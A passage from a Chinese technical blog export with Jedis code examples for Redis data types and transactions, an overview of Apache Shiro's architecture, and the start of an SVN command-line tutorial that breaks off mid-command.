Iterator&lt;String&gt; iterator = set.iterator();</span><br><span class="line">			<span class="keyword">while</span>(iterator.hasNext()) &#123;</span><br><span class="line">				System.out.println(<span class="string">"field name:"</span> + iterator.next());</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 删除field:age</span></span><br><span class="line">			jedis.hdel(<span class="string">"logininfo"</span>, <span class="string">"age"</span>);</span><br><span class="line">			<span class="comment">// 获取age</span></span><br><span class="line">			System.out.println(<span class="string">"age是null:"</span> + jedis.hget(<span class="string">"logininfo"</span>, <span class="string">"age"</span>));</span><br><span class="line">			<span class="comment">// 所有field的数量</span></span><br><span class="line">			System.out.println(<span class="string">"field个数:"</span> + jedis.hlen(<span class="string">"logininfo"</span>));</span><br><span class="line">			</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">			<span class="keyword">if</span>(jedis != <span class="keyword">null</span>) &#123;</span><br><span class="line">				<span class="comment">// 使用完的连接池对象，放回连接池</span></span><br><span class="line">				jedis.close();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">SLF4J: Failed to <span class="keyword">load</span> <span class="keyword">class</span> <span class="string">"org.slf4j.impl.StaticLoggerBinder"</span>.</span><br><span class="line">SLF4J: Defaulting <span class="keyword">to</span> <span class="keyword">no</span>-operation (NOP) logger implementation</span><br><span class="line">SLF4J: See <span class="keyword">http</span>://www.slf4j.org/codes.html<span class="comment">#StaticLoggerBinder for further details.</span></span><br><span class="line">username的值:zhangsan</span><br><span class="line">filed值:caifenglin</span><br><span class="line">filed值:www.smartdot.club</span><br><span class="line">返回<span class="built_in">boolean</span>,存在username:<span class="literal">true</span></span><br><span class="line"><span class="keyword">field</span> <span class="keyword">name</span>:website</span><br><span class="line"><span class="keyword">field</span> <span class="keyword">name</span>:age</span><br><span class="line"><span class="keyword">field</span> <span class="keyword">name</span>:username</span><br><span class="line">age是<span class="literal">null</span>:<span class="literal">null</span></span><br><span class="line"><span class="keyword">field</span>个数:<span class="number">2</span></span><br></pre></td></tr></table></figure><h4 id="列表list"><a href="#列表list" class="headerlink" title="列表list"></a>列表list</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> club.smartdot.list;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> club.smartdot.util.RedisUtil;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.Jedis;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.JedisPool;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.ListPosition;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisList</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		JedisPool pool = RedisUtil.open(<span class="string">"127.0.0.1"</span>, <span class="number">6379</span>);</span><br><span class="line">		Jedis jedis = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="comment">// 从连接池中获取Jedis对象</span></span><br><span class="line">			jedis = pool.getResource();</span><br><span class="line">			String key = <span class="string">"framework"</span>;</span><br><span class="line">			jedis.del(key);</span><br><span class="line">			jedis.lpush(key, <span class="string">"mybatis"</span>);</span><br><span class="line">			jedis.lpush(key, <span class="string">"hibernate"</span>, <span class="string">"spring"</span>, <span class="string">"springmvc"</span>);</span><br><span class="line">			List&lt;String&gt; lists = jedis.lrange(key, <span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">for</span> (String str : lists) &#123;</span><br><span class="line">				System.out.println(<span class="string">"列表数据:"</span> + str);</span><br><span class="line">			&#125;</span><br><span class="line">			System.out.println(<span class="string">"列表长度:"</span> + jedis.llen(key));</span><br><span class="line">			System.out.println(<span class="string">"插入新值后列表的长度:"</span> + jedis.linsert(key, ListPosition.AFTER, <span class="string">"spring"</span>, <span class="string">"jpa"</span>));</span><br><span class="line">			<span class="comment">// 列表右侧插入数据</span></span><br><span class="line">			jedis.rpush(key, <span class="string">"struts"</span>, <span class="string">"webwork"</span>);</span><br><span class="line">			System.out.println(<span class="string">"列表数据:"</span> + jedis.lrange(key, <span class="number">0</span>, -<span class="number">1</span>));</span><br><span class="line">			System.out.println(<span class="string">"第一个下标的值:"</span> + jedis.lindex(key, <span class="number">1</span>));</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">long</span> i = <span class="number">0</span>, len = jedis.llen(key); i &lt; len; i++) &#123;</span><br><span class="line">				System.out.println(<span class="string">"弹出值:"</span> + jedis.lpop(key));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (jedis != <span class="keyword">null</span>) &#123;</span><br><span class="line">				<span class="comment">// 使用完的连接池对象，放回连接池</span></span><br><span class="line">				jedis.close();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="集合set"><a href="#集合set" class="headerlink" title="集合set"></a>集合set</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> club.smartdot.set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> club.smartdot.util.RedisUtil;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.Jedis;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.JedisPool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisSet</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		JedisPool pool = RedisUtil.open(<span class="string">"127.0.0.1"</span>, <span class="number">6379</span>);</span><br><span class="line">		Jedis jedis = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="comment">// 从连接池中获取Jedis对象</span></span><br><span class="line">			jedis = pool.getResource();</span><br><span class="line">			String key = <span class="string">"course"</span>;</span><br><span class="line">			<span class="comment">// 添加一个数据</span></span><br><span class="line">			jedis.sadd(key, <span class="string">"html"</span>);</span><br><span class="line">			<span class="comment">// 添加多个数据</span></span><br><span class="line">			jedis.sadd(key, <span class="string">"css"</span>, <span class="string">"javascript"</span>, <span class="string">"jquery"</span>);</span><br><span class="line">			Set&lt;String&gt; smembers = jedis.smembers(key);</span><br><span class="line">			Iterator&lt;String&gt; iter = smembers.iterator();</span><br><span class="line">			<span class="keyword">while</span>(iter.hasNext()) &#123;</span><br><span class="line">				System.out.println(<span class="string">"集合成员:"</span> + iter.next());</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 判断spring是否在集合中</span></span><br><span class="line">			System.out.println(<span class="string">"spring有吗?"</span> + jedis.sismember(key, <span class="string">"spring"</span>));</span><br><span class="line">			<span class="comment">// 集合的成员数量</span></span><br><span class="line">			System.out.println(<span class="string">"集合成员个数:"</span> + jedis.scard(key));</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (jedis != <span class="keyword">null</span>) &#123;</span><br><span class="line">				<span class="comment">// 使用完的连接池对象，放回连接池</span></span><br><span class="line">				jedis.close();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="有序集合sorted-set"><a href="#有序集合sorted-set" class="headerlink" title="有序集合sorted set"></a>有序集合sorted set</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> club.smartdot.sort;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> club.smartdot.util.RedisUtil;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.Jedis;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.JedisPool;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.Tuple;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisSortSet</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		JedisPool pool = RedisUtil.open(<span class="string">"127.0.0.1"</span>, <span class="number">6379</span>);</span><br><span class="line">		Jedis jedis = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="comment">// 从连接池中获取Jedis对象</span></span><br><span class="line">			jedis = pool.getResource();</span><br><span class="line">			String key = <span class="string">"salary"</span>;</span><br><span class="line">			jedis.zadd(key, <span class="number">2000</span>D, <span class="string">"John"</span>);</span><br><span class="line">			<span class="comment">// 使用方法:zadd(String key, Map&lt;String, Double&gt;)添加多个数据</span></span><br><span class="line">			Map&lt;String, Double&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">			map.put(<span class="string">"Tom"</span>, <span class="number">3500</span>D);</span><br><span class="line">			map.put(<span class="string">"Marry"</span>, <span class="number">6500</span>D);</span><br><span class="line">			map.put(<span class="string">"Rose"</span>, <span class="number">3600</span>D);</span><br><span class="line">			map.put(<span class="string">"Mike"</span>, <span class="number">5060</span>D);</span><br><span class="line">			<span class="comment">// 添加多个数据</span></span><br><span class="line">			jedis.zadd(key, map);</span><br><span class="line">			<span class="comment">// 查询返回全部的数据，没有score</span></span><br><span class="line">			Set&lt;String&gt; zrangeByScore3 = jedis.zrangeByScore(key, <span class="string">"-inf"</span>, <span class="string">"+inf"</span>);</span><br><span class="line">			Set&lt;String&gt; zrangeByScore2 = zrangeByScore3;</span><br><span class="line">			Set&lt;String&gt; zrangeByScore = zrangeByScore2;</span><br><span class="line">			Set&lt;String&gt; sets = zrangeByScore;</span><br><span class="line">			Iterator&lt;String&gt; iterator = sets.iterator();</span><br><span class="line">			<span class="keyword">while</span>(iterator.hasNext()) &#123;</span><br><span class="line">				System.out.println(<span class="string">"排序小-大的成员"</span> + iterator.next());</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// 带有score的数据</span></span><br><span class="line">			Set&lt;Tuple&gt; tuple = jedis.zrangeByScoreWithScores(key, <span class="string">"-inf"</span>, <span class="string">"+inf"</span>);</span><br><span class="line">			Iterator&lt;Tuple&gt; iters = tuple.iterator();</span><br><span class="line">			<span class="keyword">while</span>(iters.hasNext()) &#123;</span><br><span class="line">				Tuple tu = iters.next();</span><br><span class="line">				System.out.println(<span class="string">"排序小-大的成员:"</span> + tu.getElement() + <span class="string">"# score:"</span> + tu.getScore());</span><br><span class="line">			&#125;</span><br><span class="line">			System.out.println(<span class="string">"有序集合成员数据量:"</span> + jedis.zcard(key));</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (jedis != <span class="keyword">null</span>) &#123;</span><br><span class="line">				<span class="comment">// 使用完的连接池对象，放回连接池</span></span><br><span class="line">				jedis.close();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="事物-Transaction"><a href="#事物-Transaction" class="headerlink" title="事物(Transaction)"></a>事物(Transaction)</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> club.smartdot.transcation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> club.smartdot.util.RedisUtil;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.Jedis;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.JedisPool;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.Transaction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisTransaction</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// 创建Jedis对象，连接到Redis, 需要提供ip和port</span></span><br><span class="line">		JedisPool pool = RedisUtil.open(<span class="string">"127.0.0.1"</span>, <span class="number">6379</span>);</span><br><span class="line">		Jedis jedis = <span class="keyword">null</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			jedis = pool.getResource();</span><br><span class="line">			<span class="comment">//开启事物</span></span><br><span class="line">			Transaction transaction = jedis.multi();</span><br><span class="line">			<span class="comment">// 添加字符串</span></span><br><span class="line">			transaction.mset(<span class="string">"breakfaset"</span>, <span class="string">"豆浆和包子"</span>);</span><br><span class="line">			<span class="comment">// 一次设置多个key-value</span></span><br><span class="line">			transaction.mset(<span class="string">"lunch"</span>, <span class="string">"红烧肉"</span>, <span class="string">"dinner"</span>, <span class="string">"牛肉面"</span>);</span><br><span class="line">			List&lt;Object&gt; results = transaction.exec();</span><br><span class="line">			<span class="comment">// 事物的处理结果</span></span><br><span class="line">			<span class="keyword">for</span> (Object result : results) &#123;</span><br><span class="line">				System.out.println(<span class="string">"成功的事物操作: "</span> + result);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">			<span class="keyword">if</span>(jedis != <span class="keyword">null</span>) &#123;</span><br><span class="line">				jedis.close();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>数据库</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro简介</title>
    <url>/%E6%9D%83%E9%99%90%E6%A1%86%E6%9E%B6/Shiro/d11f3a02.html</url>
    <content><![CDATA[<h2 id="Shiro简介"><a href="#Shiro简介" class="headerlink" title="Shiro简介"></a>Shiro简介</h2><ul><li>Apache Shiro是Java的一个安全(权限)框架。</li><li>Shiro可以非常容易的开发出足够好的应用，其不仅可以用在JavaSE环境，也可以用在JavaEE环境。</li><li>Shiro可以完成：认证、授权、加密、会话管理、与Web集成、缓存等。</li><li>下载: <a href="http://shiro.apache.org/" target="_blank" rel="noopener">http://shiro.apache.org/</a></li></ul><h3 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h3><p>基本功能点如下图所示：<br><img src="/images/shiro/shiro01.png" alt="shiro基本"></p><h2 id="功能简介"><a href="#功能简介" class="headerlink" title="功能简介"></a>功能简介</h2><ul><li>Authentication：身份认证/登录，验证用户是不是拥有相应的身份；</li><li>Authorization：授权，即权限验证，验证某个已认证的用户是否拥有某个权限；即判断用户是否能做事情，常见的如：验证某个用户是否拥有某个角色。或者细粒度的验证某个用户对某个资源是否具有某个权限；</li><li>Session Manager：会话管理，即用户登录后就是一次会话，在没有退出之前，它的所有信息都在会话中；会话可以是普通JavaSE环境的，也可以是如Web环境的；</li><li>Cryptography：加密，保护数据的安全性，如密码加密存储到数据库，而不是明文存储；</li><li>Web Support：Web支持，可以非常容易的集成到Web环境；</li><li>Caching：缓存，比如用户登录后，其用户信息、拥有的角色/权限不必每次去查，这样可以提高效率；</li><li>Concurrency：shiro支持多线程应用的并发验证，即如在一个线程中开启另一个线程，能把权限自动传播过去；</li><li>Testing：提供测试支持；</li><li>Run As：允许一个用户假装为另一个用户（如果他们允许）的身份进行访问；</li><li>Remember Me：记住我，这个是非常常见的功能，即一次登录后，下次再来的话不用登录了。</li></ul><h2 id="Shiro架构-shiro外部来看"><a href="#Shiro架构-shiro外部来看" class="headerlink" title="Shiro架构(shiro外部来看)"></a>Shiro架构(shiro外部来看)</h2><p>从外部来看Shiro，即从应用程序角度来观察如何使用Shiro完成工作：<br><img src="/images/shiro/shiro02.png" alt="shiro外部架构"></p><p>可以看到：应用代码直接交互的对象是Subject，也就是说Shiro的对外API核心就是Subject；其每个API的含义：</p><ul><li><p>Subject：主体，代表了当前“用户”，这个用户不一定是一个具体的人，与当前应用交互的任何东西都是Subject，如网络爬虫，机器人等；即一个抽象概念；所有Subject都绑定到SecurityManager，与Subject的所有交互都会委托给SecurityManager；可以把Subject认为是一个门面；SecurityManager才是实际的执行者；<br>SecurityManager：安全管理器；即所有与安全有关的操作都会与SecurityManager交互；且它管理着所有Subject；可以看出它是Shiro的核心，它负责与后边介绍的其他组件进行交互，如果学习过SpringMVC，你可以把它看成DispatcherServlet前端控制器；</p></li><li><p>Realm：域，Shiro从从Realm获取安全数据（如用户、角色、权限），就是说SecurityManager要验证用户身份，那么它需要从Realm获取相应的用户进行比较以确定用户身份是否合法；也需要从Realm得到用户相应的角色/权限进行验证用户是否能进行操作；可以把Realm看成DataSource，即安全数据源。</p></li></ul><p>也就是说对于我们而言，最简单的一个Shiro应用：<br>1、应用代码通过Subject来进行认证和授权，而Subject又委托给SecurityManager；<br>2、我们需要给Shiro的SecurityManager注入Realm，从而让SecurityManager能得到合法的用户及其权限进行判断。</p><p>从以上也可以看出，Shiro不提供维护用户/权限，而是通过Realm让开发人员自己注入。</p><h2 id="Shiro内部架构"><a href="#Shiro内部架构" class="headerlink" title="Shiro内部架构"></a>Shiro内部架构</h2><p>接下来我们来从Shiro内部来看下Shiro的架构，如下图所示：<br><img src="/images/shiro/shiro03.png" alt="shiro内部架构"></p><ul><li>Subject：主体，可以看到主体可以是任何可以与应用交互的“用户”；</li><li>SecurityManager：相当于SpringMVC中的DispatcherServlet或者Struts2中的FilterDispatcher；是Shiro的心脏；所有具体的交互都通过SecurityManager进行控制；它管理着所有Subject、且负责进行认证和授权、及会话、缓存的管理。</li><li>Authenticator：认证器，负责主体认证的，这是一个扩展点，如果用户觉得Shiro默认的不好，可以自定义实现；其需要认证策略（Authentication Strategy），即什么情况下算用户认证通过了；</li><li>Authrizer：授权器，或者访问控制器，用来决定主体是否有权限进行相应的操作；即控制着用户能访问应用中的哪些功能；</li><li>Realm：可以有1个或多个Realm，可以认为是安全实体数据源，即用于获取安全实体的；可以是JDBC实现，也可以是LDAP实现，或者内存实现等等；由用户提供；注意：Shiro不知道你的用户/权限存储在哪及以何种格式存储；所以我们一般在应用中都需要实现自己的Realm；</li><li>SessionManager：如果写过Servlet就应该知道Session的概念，Session呢需要有人去管理它的生命周期，这个组件就是SessionManager；而Shiro并不仅仅可以用在Web环境，也可以用在如普通的JavaSE环境、EJB等环境；所有呢，Shiro就抽象了一个自己的Session来管理主体与应用之间交互的数据；这样的话，比如我们在Web环境用，刚开始是一台Web服务器；接着又上了台EJB服务器；这时想把两台服务器的会话数据放到一个地方，这个时候就可以实现自己的分布式会话（如把数据放到Memcached服务器）；</li><li>SessionDAO：DAO大家都用过，数据访问对象，用于会话的CRUD，比如我们想把Session保存到数据库，那么可以实现自己的SessionDAO，通过如JDBC写到数据库；比如想把Session放到Memcached中，可以实现自己的Memcached SessionDAO；另外SessionDAO中可以使用Cache进行缓存，以提高性能；</li><li>CacheManager：缓存控制器，来管理如用户、角色、权限等的缓存的；因为这些数据基本上很少去改变，放到缓存中后可以提高访问的性能</li><li>Cryptography：密码模块，Shiro提高了一些常见的加密组件用于如密码加密/解密的。</li></ul><p>到此Shiro架构及其组件就认识完了，接下来挨着学习Shiro的组件吧。</p>]]></content>
      <categories>
        <category>权限框架</category>
        <category>Shiro</category>
      </categories>
      <tags>
        <tag>Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>专题:SVN版本控制技术</title>
    <url>/SVN/a8d8e853.html</url>
    <content><![CDATA[<h2 id="第1章-SVN概述"><a href="#第1章-SVN概述" class="headerlink" title="第1章 SVN概述"></a>第1章 SVN概述</h2><h3 id="SVN简介"><a href="#SVN简介" class="headerlink" title="SVN简介"></a>SVN简介</h3><h4 id="什么是SVN"><a href="#什么是SVN" class="headerlink" title="什么是SVN"></a>什么是SVN</h4><p>SVN是Subversion的简称，是一个开放源代码的版本控制系统，相较于RCS、CVS，它采用了分支管理系统，它的设计目标就是取代CVS。互联网上很多版本控制服务已从CVS迁移到Subversion。说得简单一点SVN就是用于多个人共同开发同一个项目，共用资源的目的。</p><h4 id="SVN的作用"><a href="#SVN的作用" class="headerlink" title="SVN的作用"></a>SVN的作用</h4><p>使用SVN的目的主要有两个:</p><blockquote><p>实现项目组中的资源共享<br>实现资源文件的版本控制</p></blockquote><h4 id="SVN的工作原理"><a href="#SVN的工作原理" class="headerlink" title="SVN的工作原理"></a>SVN的工作原理</h4><p>Subversion是一个自由开源的版本控制系统。在Subversion管理下，文件和目录可以超越时空。Subversion将文件存放在中心版本库里，这个版本库很像一个普通的文件服务器，不同的是，它可以记录每一次文件和目录的修改情况，这样就可以借此将数据恢复到以前的版本，并可以查看数据的更改细节。正因为如此，许多人将版本控制系统当作一种神奇的“时间机器”。<br><img src="/images/version/svn/svn02.png" alt="效果图"></p><h3 id="传统文件共享方式的弊端"><a href="#传统文件共享方式的弊端" class="headerlink" title="传统文件共享方式的弊端"></a>传统文件共享方式的弊端</h3><h4 id="拷贝方式的弊端"><a href="#拷贝方式的弊端" class="headerlink" title="拷贝方式的弊端"></a>拷贝方式的弊端</h4><p><img src="/images/version/svn/svn03.png" alt="效果图"></p><blockquote><p>发送与接受文件的工作量巨大<br>无法及时获取到更新<br>对于之前版本的恢复较难,即使可以恢复，也大量浪费控件。<br>若一个文件由多个修改，则会出现内容冲突问题。且难于确定修改的具体时间及修改人。<br>······</p></blockquote><h4 id="文件服务器的弊端"><a href="#文件服务器的弊端" class="headerlink" title="文件服务器的弊端"></a>文件服务器的弊端</h4><p><img src="/images/version/svn/svn04.png" alt="效果图"></p><blockquote><p>空间大量浪费<br>资源无法设定访问权限<br>资源安全性很低<br>发生冲突资源，无法自动合并<br>·······</p></blockquote><h3 id="SVN的体系结构图"><a href="#SVN的体系结构图" class="headerlink" title="SVN的体系结构图"></a>SVN的体系结构图</h3><p><img src="/images/version/svn/svn05.jpg" alt="效果图"></p><h4 id="客户层"><a href="#客户层" class="headerlink" title="客户层"></a>客户层</h4><blockquote><p>GUI:图形化界面<br>Command Line：命令行</p></blockquote><h4 id="服务层"><a href="#服务层" class="headerlink" title="服务层"></a>服务层</h4><blockquote><p>http协议(需要Apache服务)<br>svn协议</p></blockquote><h4 id="仓库层"><a href="#仓库层" class="headerlink" title="仓库层"></a>仓库层</h4><blockquote><p>FSFS(常用)<br>Berkley DB(Oracle)</p></blockquote><h3 id="SVN的下载"><a href="#SVN的下载" class="headerlink" title="SVN的下载"></a>SVN的下载</h3><p><img src="/images/version/svn/svn06.png" alt="效果图"><br>下载页面链接:<a href="https://www.visualsvn.com/downloads/" target="_blank" rel="noopener">https://www.visualsvn.com/downloads/</a><br>Apache-Subversion下载地址: <a href="https://www.visualsvn.com/files/Apache-Subversion-1.10.0.zip" target="_blank" rel="noopener">Apache-Subversion-1.10.0.zip</a>.<br>VisualSVN-Server下载地址: <a href="https://www.visualsvn.com/files/VisualSVN-Server-3.8.1-x64.msi" target="_blank" rel="noopener">VisualSVN-Server-3.8.1-x64.msi</a>.</p><h2 id="第2章-SVN命令行的使用"><a href="#第2章-SVN命令行的使用" class="headerlink" title="第2章 SVN命令行的使用"></a>第2章 SVN命令行的使用</h2><h3 id="SVN的安装与配置"><a href="#SVN的安装与配置" class="headerlink" title="SVN的安装与配置"></a>SVN的安装与配置</h3><h4 id="SVN安装"><a href="#SVN安装" class="headerlink" title="SVN安装"></a>SVN安装</h4><p>下载Apache-Subversion，并解压到D盘Subversion目录下，通过命令行提示符(管理员)及CMD命令，进入D盘下Subversion\bin目录，输入svn -h,如果出现如下图一串，说明SVN没有问题。<br><img src="/images/version/svn/svn07.png" alt="效果图"><br><img src="/images/version/svn/svn08.png" alt="效果图"></p><h4 id="SVN环境变量配置"><a href="#SVN环境变量配置" class="headerlink" title="SVN环境变量配置:"></a>SVN环境变量配置:</h4><p>SVN_HOME:D:\Subversion<br>Path:%SVN_HOME%\bin</p><h3 id="SVN常用命令"><a href="#SVN常用命令" class="headerlink" title="SVN常用命令"></a>SVN常用命令</h3><h4 id="SVN管理员命令"><a href="#SVN管理员命令" class="headerlink" title="SVN管理员命令"></a>SVN管理员命令</h4><h5 id="svnadmin-help"><a href="#svnadmin-help" class="headerlink" title="svnadmin help"></a>svnadmin help</h5><p>查看所有管理员命令:svnadmin help<br><img src="/images/version/svn/svn09.png" alt="效果图"></p><h5 id="svnadmin-–version"><a href="#svnadmin-–version" class="headerlink" title="svnadmin –version"></a>svnadmin –version</h5><p>查看当前svn版本:svnadmin –version<br><img src="/images/version/svn/svn10.png" alt="效果图"></p><h5 id="svnadmin-help-create"><a href="#svnadmin-help-create" class="headerlink" title="svnadmin help create"></a>svnadmin help create</h5><p>查看当前命令如何使用:svnadmin help create<br><img src="/images/version/svn/svn11.png" alt="效果图"></p><h5 id="svnadmin-create"><a href="#svnadmin-create" class="headerlink" title="svnadmin create"></a>svnadmin create</h5><p>创建SVN版本仓库:svnadmin create</p><blockquote><p>SVN仓库分为两级：顶级仓库与根仓库<br>该命令用于创建SVN版本仓库，确切说，创建的是根仓库。<br>注意,在创建根仓库时，顶层仓库目录必须是存在的，其不会自动创建。根仓库目录是否存在，均是可以的。若根仓库目录不存在，命令会自动创建该根仓库。<br><img src="/images/version/svn/svn12.png" alt="效果图"></p></blockquote><h5 id="svn仓库目录结构"><a href="#svn仓库目录结构" class="headerlink" title="svn仓库目录结构"></a>svn仓库目录结构</h5><p>svn仓库目录如下:</p><blockquote><p>conf：配置文件(svnserver.conf:连接仓库，authz：权限, passwd：密码, &gt;hooks-env.tmpl：钩子运行环境配置，可以实现客户端数据的自动更新功能)<br>db: 具体版本内容(不存在冗余，以日志方式保存)<br>hooks: 可以实现客户端数据的自动更新功能<br>locks: 锁<br><img src="/images/version/svn/svn13.png" alt="效果图"></p></blockquote><h4 id="SVN服务端命令"><a href="#SVN服务端命令" class="headerlink" title="SVN服务端命令"></a>SVN服务端命令</h4><h5 id="svnserve-d"><a href="#svnserve-d" class="headerlink" title="svnserve -d"></a>svnserve -d</h5><p><img src="/images/version/svn/svn14.png" alt="效果图"></p><blockquote><p>svnserve -d 用于开启DOS系统下的SVN服务<br><img src="/images/version/svn/svn15.png" alt="效果图"><br>此守护线程监控着一个端口,即svn服务默认端口3690<br>netstat -a 命令查看当前网络的连接状态。net status<br><img src="/images/version/svn/svn16.png" alt="效果图"></p></blockquote><h5 id="svnserve-d-–listen-port-8888"><a href="#svnserve-d-–listen-port-8888" class="headerlink" title="svnserve -d –listen-port=8888"></a>svnserve -d –listen-port=8888</h5><blockquote><p><img src="/images/version/svn/svn17.png" alt="效果图"><br><img src="/images/version/svn/svn18.png" alt="效果图"><br>可以看出，监听端口没有3690，而是8888<br>svn://localhost:3690/ G:/ENML/SVNRepositories/test 等价于svn://localhost/ G:/ENML/SVNRepositories/test<br>svnserve -d –listen-port=8888 指定SVN服务占用的端口号为8888<br>svn://localhost:8888/ G:/ENML/SVNRepositories/test</p></blockquote><h5 id="svnserve-d-r"><a href="#svnserve-d-r" class="headerlink" title="svnserve -d -r"></a>svnserve -d -r</h5><blockquote><p>可以看到 G:/ENML/SVNRepositories/test这层目录暴露出来存在极大的安全隐患，但是顶层仓库是必须要告诉给客户端的<br>我们可以用另外一个参数指定顶层仓库的位置，这样以后顶层仓库就不用再写了。<br><img src="/images/version/svn/svn19.png" alt="效果图"><br>svnserve -d -r G:/ENML/SVNRepositories 指定默认的SVN顶层仓库的路径。一旦指定，那么客户端在使用svn时直接跟仓库名即可。<br>svn://localhost/test</p></blockquote><h5 id="将SVN服务注册为开机自启动的windows服务"><a href="#将SVN服务注册为开机自启动的windows服务" class="headerlink" title="将SVN服务注册为开机自启动的windows服务"></a>将SVN服务注册为开机自启动的windows服务</h5><blockquote><p>sc create SVNService binpath=”D:/Subversion/bin/svnserve.exe –service -r G:/ENML/SVNRepositories” start=auto depend=Tcpip<br>启动SVN服务: net start SVNService<br>停止SVN服务: net stop SVNService<br>删除SVN服务: sc delete 